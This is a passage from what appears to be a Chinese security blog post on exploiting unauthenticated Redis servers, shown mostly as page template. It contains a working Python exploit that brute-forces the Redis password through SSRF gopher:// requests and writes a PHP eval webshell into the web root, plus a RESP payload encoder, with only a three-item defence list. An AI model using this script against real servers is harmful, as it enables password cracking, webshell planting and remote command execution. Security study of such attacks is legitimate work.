function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span>(urllib.parse.quote(payload))</span><br></pre></td></tr></table></figure>
+<p>payload2</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> Request, urlopen</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://xxxxxx/?url=&quot;</span></span><br><span class="line">gopher = <span class="string">&quot;gopher://127.0.0.1:6379/_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;message.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)         <span class="comment">#密码文件</span></span><br><span class="line">    <span class="keyword">return</span> f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encoder_url</span>(<span class="params">cmd</span>):</span><br><span class="line">    urlencoder = quote(cmd).replace(<span class="string">&quot;%0A&quot;</span>, <span class="string">&quot;%0D%0A&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> urlencoder</span><br><span class="line"></span><br><span class="line"><span class="comment">###------暴破密码，无密码可删除-------###</span></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> get_password():</span><br><span class="line">    <span class="comment"># 攻击脚本</span></span><br><span class="line">    path = <span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;\\n\\n\\n&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;\\n\\n\\n&quot;</span></span><br><span class="line">    filename = <span class="string">&quot;shell.php&quot;</span></span><br><span class="line"></span><br><span class="line">    cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    auth %s</span></span><br><span class="line"><span class="string">    quit</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> % password</span><br><span class="line">    <span class="comment"># 二次编码</span></span><br><span class="line">    encoder = encoder_url(encoder_url(cmd))</span><br><span class="line">    <span class="comment"># 生成payload</span></span><br><span class="line">    payload = url + gopher + encoder</span><br><span class="line">    <span class="comment"># 发起请求</span></span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    request = Request(payload)</span><br><span class="line">    response = urlopen(request).read().decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This time password is:&quot;</span> + password)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Get response is:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response)</span><br><span class="line">    <span class="keyword">if</span> response.count(<span class="string">&quot;+OK&quot;</span>) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;find password : &quot;</span> + password)</span><br><span class="line">        <span class="comment">#####---------------如无密码，直接从此开始执行---------------#####</span></span><br><span class="line">        cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        auth %s</span></span><br><span class="line"><span class="string">        config set dir %s</span></span><br><span class="line"><span class="string">        config set dbfilename %s</span></span><br><span class="line"><span class="string">        set test1 &quot;%s&quot;</span></span><br><span class="line"><span class="string">        save</span></span><br><span class="line"><span class="string">        quit</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span> % (password, path, filename, shell)</span><br><span class="line">        <span class="comment"># 二次编码</span></span><br><span class="line">        encoder = encoder_url(encoder_url(cmd))</span><br><span class="line">        <span class="comment"># 生成payload</span></span><br><span class="line">        payload = url + gopher + encoder</span><br><span class="line">        <span class="comment"># 发起请求</span></span><br><span class="line">        request = Request(payload)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        response = urlopen(request).read().decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;response is:&quot;</span> + response)</span><br><span class="line">        <span class="keyword">if</span> response.count(<span class="string">&quot;+OK&quot;</span>) &gt; <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Write success！&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Write failed. Please check and try again&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="comment">#####---------------如无密码，到此处结束------------------#####</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Password not found!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Please change the dictionary,and try again.&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h1 id="Redis攻击防范"><a href="#Redis攻击防范" class="headerlink" title="Redis攻击防范"></a>Redis攻击防范</h1><ul>
+<li>限制登录ip</li>
+<li>添加密码</li>
+<li>修改默认端口</li>
+</ul>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/256?time__1311=Cqjhq%2Bx0xIhrDsD7GAhemuDqfxYq4xIwD">Redis未授权访问漏洞利用总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2295?time__1311=n4%2BxnieDq7qCq7KGQQDsf32EDgBBDcADGweeAwD">原创-Redis漏洞利用与防御</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13071?time__1311=mqmxnDBDuDcAiQeDsD7mN0%3Dnxzm0Q7ND9YD">Redis漏洞及其利用</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2024/03/07/%E4%B8%80%E4%BA%9B%E8%BF%87%E6%BB%A4%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" rel="next" title="某些过滤的绕过方式汇总">
+                <i class="fa fa-chevron-left"></i> 某些过滤的绕过方式汇总
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Redis%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">Redis介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%B1%95%E7%A4%BA"><span class="nav-number">1.1.</span> <span class="nav-text">基本命令展示</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E7%9A%843%E7%A7%8D%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA"><span class="nav-number">2.</span> <span class="nav-text">Redis未授权的3种常见攻击演示</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99ssh-keygen%E5%85%AC%E9%92%A5%E7%84%B6%E5%90%8E%E4%BD%BF%E7%94%A8%E7%A7%81%E9%92%A5%E7%99%BB%E9%99%86"><span class="nav-number">2.2.</span> <span class="nav-text">写ssh-keygen公钥然后使用私钥登陆</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.2.1.</span> <span class="nav-text">适用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kali%E6%89%93%E5%BC%8022%E7%AB%AF%E5%8F%A3"><span class="nav-number">2.2.2.</span> <span class="nav-text">kali打开22端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%AF%86%E9%92%A5%E5%AF%B9%E7%94%9F%E6%88%90"><span class="nav-number">2.2.3.</span> <span class="nav-text">第一步：密钥对生成</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">2.2.4.</span> <span class="nav-text">第二步：执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E8%BF%9E%E6%8E%A5ssh"><span class="nav-number">2.2.5.</span> <span class="nav-text">第三步：连接ssh</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%91web%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%E5%86%99Webshell"><span class="nav-number">2.3.</span> <span class="nav-text">向web物理路径写Webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="nav-number">2.3.1.</span> <span class="nav-text">适用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">2.3.2.</span> <span class="nav-text">第一步：执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.3.3.</span> <span class="nav-text">第二步：蚁剑连接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">2.4.</span> <span class="nav-text">利用计划任务执行命令反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E6%9D%A1%E4%BB%B6-2"><span class="nav-number">2.4.1.</span> <span class="nav-text">适用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E7%A8%8B"><span class="nav-number">2.4.2.</span> <span class="nav-text">过程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BD%93Redis%E9%81%87%E4%B8%8ASSRF-%E5%BE%85%E5%81%9A"><span class="nav-number">3.</span> <span class="nav-text">当Redis遇上SSRF(待做)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shiro-redis%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%BE%85%E5%81%9A"><span class="nav-number">4.</span> <span class="nav-text">shiro-redis反序列化(待做)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">5.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Redis%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC"><span class="nav-number">5.1.</span> <span class="nav-text">Redis弱口令爆破脚本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Redis%E6%94%BB%E5%87%BB%E9%98%B2%E8%8C%83"><span class="nav-number">6.</span> <span class="nav-text">Redis攻击防范</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-number">7.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sxq</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+</body>
+</html>
